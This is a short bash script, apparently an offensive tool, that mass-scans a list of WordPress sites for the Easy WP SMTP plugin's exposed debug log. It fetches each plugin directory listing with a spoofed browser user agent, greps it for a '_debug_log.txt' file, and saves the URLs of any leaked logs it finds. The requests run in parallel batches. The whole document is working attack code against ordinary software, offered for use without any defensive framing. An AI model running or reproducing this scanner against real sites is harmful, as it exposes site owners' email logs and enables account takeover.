#!/bin/bash
# @author : shandpy <icq : @shandpy> 
# @tested : Ubuntu 20.04
# @name : easy-wp-smtp vulnerable debug log 
#

function easywpsmtp(){
	wpeSMTP=$(curl -sL -m 5 -A "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0" "${1}/wp-content/plugins/easy-wp-smtp/" | grep -o -P '.{0,13}_debug_log.txt' | head -1)
	if [[ -z $wpeSMTP ]]; then
		echo " [!] NOT FOUND $1"
	else
		echo " [!] FOUND $1"
		echo "${1}/wp-content/plugins/easy-wp-smtp/${wpeSMTP}" >> Results/easysmtp_wordpress.txt
	fi
}
mkdir -p Results
read -p " Input your list => " LIST
read -p " Send to (5/10/15/...): " SENDTO
read -p " Delay(2/5/10/...): " WDELAY
CALC=0
IFS=$'\r\n' GLOBIGNORE='*' command eval 'LIST=($(cat $LIST))'
for (( i = 0; i <"${#LIST[@]}"; i++ )); do
 
  SITES="${LIST[$i]}"
 
  SENDd=$(expr $CALC % $SENDTO)
  if [[ $SENDd == 0 && $CALC > 0 ]]; then
    sleep $WDELAY
  fi
  easywpsmtp $SITES &
  CALC=$[$CALC+1]
done
wait
